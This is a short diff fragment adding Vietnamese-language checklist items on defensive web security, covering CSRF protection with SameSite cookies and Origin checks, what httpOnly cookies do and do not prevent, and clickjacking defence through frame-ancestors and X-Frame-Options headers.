+- `SameSite=Lax` chặn phần lớn CSRF, nhưng vẫn cần kiểm tra `Origin` hoặc token cho subdomain, `GET` có tác dụng phụ và cookie `SameSite=None`. CORS không phải là chống CSRF.
+- httpOnly cookie không ngăn XSS lợi dụng session, nhưng ngăn token bị lấy đi — đó là khác biệt đáng giá.
+- Chặn clickjacking bằng `frame-ancestors` qua HTTP header, kèm `X-Frame-Options` cho trình duyệt cũ.
+
+</Checklist>
